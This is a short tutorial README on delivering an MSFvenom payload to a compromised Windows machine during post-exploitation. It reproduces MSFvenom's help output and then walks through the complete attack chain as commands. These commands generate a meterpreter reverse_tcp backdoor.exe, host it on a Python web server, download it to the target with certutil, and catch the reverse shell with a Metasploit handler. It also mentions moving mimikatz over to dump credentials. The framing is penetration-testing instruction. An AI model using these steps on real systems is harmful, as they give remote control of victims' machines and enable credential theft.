# Trasferring-Malicious-Payload-MSFvenom
Let's introduce how to transferring files on Target Machine (Windows &amp; Linux)
# Introduction MSFvenom
Msftvenom is a tool for generating and encoding payloads for penetration testing. It is part of the Metasploit Framework, a popular suite of tools for security professionals. Msftvenom can create payloads for various platforms and formats, and it can also apply different encoders to evade detection. The purpose of msftvenom is to create malicious code that can be injected into a target system to gain access or execute commands.<br>
<img src="msfvenom.png" width=70% height="auto"><br>

MsfVenom - a Metasploit standalone payload generator.<br>
Also a replacement for msfpayload and msfencode.<br>
Usage: /usr/bin/msfvenom [options] <var=val><br>
Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe<br>

Options:<br>
     - -l, --list            <type>     **List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all**<br>
     - -p, --payload         <payload>  **Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom**<br>
         - --list-options               **List --payload <value>'s standard, advanced and evasion options**<br>
     - -f, --format          <format>   **Output format (use --list formats to list)** <br>
     - -e, --encoder         <encoder>  **The encoder to use (use --list encoders to list)** <br>
         - --service-name    <value>    **The service name to use when generating a service binary**<br>
         - --sec-name        <value>    **The new section name to use when generating large Windows binaries. Default: random 4-character alpha string**<br>
         - --smallest                   **Generate the smallest possible payload using all available encoders**<br>
         - --encrypt         <value>    **The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)** <br>
         - --encrypt-key     <value>    **A key to be used for --encrypt**<br>
         - --encrypt-iv      <value>    **An initialization vector for --encrypt**<br>
     - -a, --arch            <arch>     **The architecture to use for --payload and --encoders (use --list archs to list)** <br>
         - --platform        <platform> **The platform for --payload (use --list platforms to list)** <br>
     - -o, --out             <path>     **Save the payload to a file** <br>
     - -b, --bad-chars       <list>     **Characters to avoid example: '\x00\xff'** <br>
     - -n, --nopsled         <length>   **Prepend a nopsled of [length] size on to the payload** <br>
         - --pad-nops                   **Use nopsled size specified by -n <length> as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)** <br>
     - -s, --space           <length>   **The maximum size of the resulting payload** <br>
         - --encoder-space   <length>   **The maximum size of the encoded payload (defaults to the -s value)** <br>
     - -i, --iterations      <count>    **The number of times to encode the payload** <br>
     - -c, --add-code        <path>     **Specify an additional win32 shellcode file to include** <br>
     - -x, --template        <path>     **Specify a custom executable file to use as a template** <br>
     - -k, --keep                       **Preserve the --template behaviour and inject the payload as a new thread** <br>
     - -v, --var-name        <value>    **Specify a custom variable name to use for certain output formats** <br>
     - -t, --timeout         <second>   **The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)** <br>
     - -h, --help                       **Show this message** <br>


## Example of trasferring malicious payload<br>
We are in Post Explotation phase, so you need an initial access on the Target.  <br>
I transferred a payload created by msfvenom, but you can transfer all files you need, like mimikatz.exe to perform credentials dumping, etc. <br><br>
**Command to generate a malicious payload (reverse_tcp): msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.9.3 LPORT=4444 -f exe > 'backdoor.exe' (set LPORT and LHOST where you want to receive the connection) <br>**
<img src="venompayload.png" width=85% height="auto"><br><br>
**Setting up the web server: python3 -m http.server 80 <br>**
<img src="python.png" width=70% height="auto"><br><br>
**Download the payload with certutil: certutil -urlcache -f http://10.10.9.3/backdoor.exe <br>**
<img src="certutil.png" width=60% height="auto"><br><br>
**Use Metasploit to setting up a handler to listening the connections <br>**
<img src="handler.png" width=50% height="auto"><br><br>
**Execute the backdoor.exe on the Target and you got a Meterpreter Session on your Machine**





#Author
<b>Xiao Li Savio Feng</b>
